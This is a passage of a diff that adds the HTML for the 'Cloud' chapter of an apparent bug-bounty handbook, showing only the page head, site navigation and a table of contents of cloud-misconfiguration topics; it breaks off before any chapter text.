@@ -1,0 +1,2234 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Cloud misconfigurations — exposed storage, unauthenticated APIs, leaked credentials, and open dashboards — are consistently Critical-severity findings with minimal exploitation complexity.">
+      
+      
+        <meta name="author" content="Wellington Vumu">
+      
+      
+      
+        <link rel="prev" href="../part-08-ai-llm/">
+      
+      
+        <link rel="next" href="../part-10-mobile/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.39">
+    
+    
+      
+        <title>Cloud - Hunter's handbook</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../assets/stylesheets/modern/main.1e981d71.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,500,500i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#cloud" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-header__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hunter's handbook
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Cloud
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-moon" viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-nav__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    Hunter's handbook
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="./.." class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-rocket" viewBox="0 0 24 24"><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09"/><path d="M9 12a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.4 22.4 0 0 1-4 2z"/><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 .05 5 .05"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-01-recon/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-02-authentication/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-round-key" viewBox="0 0 24 24"><path d="M19 11v6M19 13h2M2 21a8 8 0 0 1 12.868-6.349"/><circle cx="10" cy="8" r="5"/><circle cx="19" cy="19" r="2"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-03-access-control/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-lock" viewBox="0 0 24 24"><path d="M19 16v-2a2 2 0 0 0-4 0v2M9.5 15H7a4 4 0 0 0-4 4v2"/><circle cx="10" cy="7" r="4"/><rect width="8" height="5" x="13" y="16" rx=".899"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-04-injection/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-syringe" viewBox="0 0 24 24"><path d="m18 2 4 4M17 7l3-3M19 9 8.7 19.3c-1 1-2.5 1-3.4 0l-.6-.6c-1-1-1-2.5 0-3.4L15 5M9 11l4 4M5 19l-3 3M14 4l6 6"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-05-ssrf-xxe/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server" viewBox="0 0 24 24"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><path d="M6 6h.01M6 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF & XXE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-06-business-logic/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain" viewBox="0 0 24 24"><path d="M12 18V5M15 13a4.17 4.17 0 0 1-3-4 4.17 4.17 0 0 1-3 4M17.598 6.5A3 3 0 1 0 12 5a3 3 0 1 0-5.598 1.5"/><path d="M17.997 5.125a4 4 0 0 1 2.526 5.77"/><path d="M18 18a4 4 0 0 0 2-7.464"/><path d="M19.967 17.483A4 4 0 1 1 12 18a4 4 0 1 1-7.967-.517"/><path d="M6 18a4 4 0 0 1-2-7.464"/><path d="M6.003 5.125a4 4 0 0 0-2.526 5.77"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-07-api/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cog" viewBox="0 0 24 24"><path d="M11 10.27 7 3.34M11 13.73l-4 6.93M12 22v-2M12 2v2M14 12h8M17 20.66l-1-1.73M17 3.34l-1 1.73M2 12h2M20.66 17l-1.73-1M20.66 7l-1.73 1M3.34 17l1.73-1M3.34 7l1.73 1"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="12" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    API Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-08-ai-llm/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain-circuit" viewBox="0 0 24 24"><path d="M12 5a3 3 0 1 0-5.997.125 4 4 0 0 0-2.526 5.77 4 4 0 0 0 .556 6.588A4 4 0 1 0 12 18Z"/><path d="M9 13a4.5 4.5 0 0 0 3-4M6.003 5.125A3 3 0 0 0 6.401 6.5M3.477 10.896a4 4 0 0 1 .585-.396M6 18a4 4 0 0 1-1.967-.516M12 13h4M12 18h6a2 2 0 0 1 2 2v1M12 8h8M16 8V5a2 2 0 0 1 2-2"/><circle cx="16" cy="13" r=".5"/><circle cx="18" cy="3" r=".5"/><circle cx="20" cy="21" r=".5"/><circle cx="20" cy="8" r=".5"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    AI & LLM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cloud" viewBox="0 0 24 24"><path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cloud" viewBox="0 0 24 24"><path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#aws" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        AWS
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AWS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#s3-bucket-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        S3 Bucket Enumeration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ec2-metadata-via-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        EC2 Metadata via SSRF
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exposed-aws-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed AWS Keys
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cognito-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Cognito Misconfiguration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#google-cloud-platform-gcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Google Cloud Platform (GCP)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Google Cloud Platform (GCP)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gcs-bucket-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        GCS Bucket Misconfiguration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#firebase-exposed-databases" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Firebase Exposed Databases
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gcp-metadata-endpoint" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        GCP Metadata Endpoint
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#microsoft-azure" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Microsoft Azure
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Microsoft Azure">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#azure-blob-storage-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Azure Blob Storage Misconfiguration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#azure-metadata-endpoint" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Azure Metadata Endpoint
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#generic-cloud-recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Generic Cloud Recon
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Generic Cloud Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cloud-asset-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Cloud Asset Discovery
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nuclei-cloud-templates" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Nuclei Cloud Templates
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kubernetes-and-container-misconfigurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Kubernetes and Container Misconfigurations
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Kubernetes and Container Misconfigurations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exposed-kubernetes-dashboard" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed Kubernetes Dashboard
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unauthenticated-kubelet-api" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Unauthenticated Kubelet API
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssrf-to-internal-kubernetes-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        SSRF to Internal Kubernetes Services
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exposed-services-and-panels" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed Services and Panels
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exposed Services and Panels">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exposed-admin-panels-and-internal-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed Admin Panels and Internal Tools
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exposed-debug-interfaces" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed Debug Interfaces
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exposed-git-and-config-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed .git and Config Files
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-10-mobile/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-smartphone" viewBox="0 0 24 24"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Mobile
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-11-reporting/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-notebook-pen" viewBox="0 0 24 24"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4M2 6h4M2 10h4M2 14h4M2 18h4"/><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reporting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-12-platform/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-layers" viewBox="0 0 24 24"><path d="M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z"/><path d="M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12"/><path d="M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Platform
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-13-tooling/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-wrench" viewBox="0 0 24 24"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.106-3.105c.32-.322.863-.22.983.218a6 6 0 0 1-8.259 7.057l-7.91 7.91a1 1 0 0 1-2.999-3l7.91-7.91a6 6 0 0 1 7.057-8.259c.438.12.54.662.219.984z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Tooling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-14-infrastructure/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server-cog" viewBox="0 0 24 24"><path d="m10.852 14.772-.383.923M13.148 14.772a3 3 0 1 0-2.296-5.544l-.383-.923M13.148 9.228l.383-.923"/><path d="m13.53 15.696-.382-.924a3 3 0 1 1-2.296-5.544M14.772 10.852l.923-.383M14.772 13.148l.923.383"/><path d="M4.5 10H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2h-.5M4.5 14H4a2 2 0 0 0-2 2v4a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-4a2 2 0 0 0-2-2h-.5M6 18h.01M6 6h.01M9.228 10.852l-.923-.383M9.228 13.148l-.923.383"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../appendices/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-file-text" viewBox="0 0 24 24"><path d="M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z"/><path d="M14 2v5a1 1 0 0 0 1 1h5M10 9H8M16 13H8M16 17H8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Appendices
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  
+                    
+                    
+                    
+                      
+                    
+                    
+                      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                      <div class="md-sidebar-button__wrapper">
+                        <label class="md-sidebar-button" for="__toc"></label>
+                      </div>
+                    
+                  
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#aws" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        AWS
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AWS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#s3-bucket-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        S3 Bucket Enumeration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ec2-metadata-via-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        EC2 Metadata via SSRF
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exposed-aws-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Exposed AWS Keys
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cognito-misconfiguration" class="md-nav__link">
+    <span class="md-ellipsis">
